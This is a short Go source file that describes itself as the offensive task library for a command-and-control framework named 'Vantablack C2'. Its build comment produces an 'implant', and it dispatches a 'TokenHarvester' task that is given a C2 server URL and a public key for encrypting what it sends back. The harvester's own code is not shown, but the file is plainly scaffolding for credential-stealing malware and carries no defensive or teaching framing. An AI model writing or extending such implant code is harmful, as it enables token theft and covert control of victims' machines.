// Package tasks provides the offensive task library for the Vantablack C2.
//
// Build : go build -o bin/implant ./c2/
package tasks

import "fmt"

// Version of the task library.
const Version = "0.1.0"

// ListTasks returns the names of all available tasks.
func ListTasks() []string {
	return []string{
		"TokenHarvester",
	}
}

// Dispatch runs the task with the given name.
func Dispatch(name string, c2url string, pubkeyPEM string) error {
	switch name {
	case "TokenHarvester":
		th := &TokenHarvester{C2URL: c2url}
		// In prod, parse the PEM pubkey for RSA-OAEP encryption.
		_ = pubkeyPEM
		return th.Run()
	default:
		return fmt.Errorf("unknown task: %s", name)
	}
}
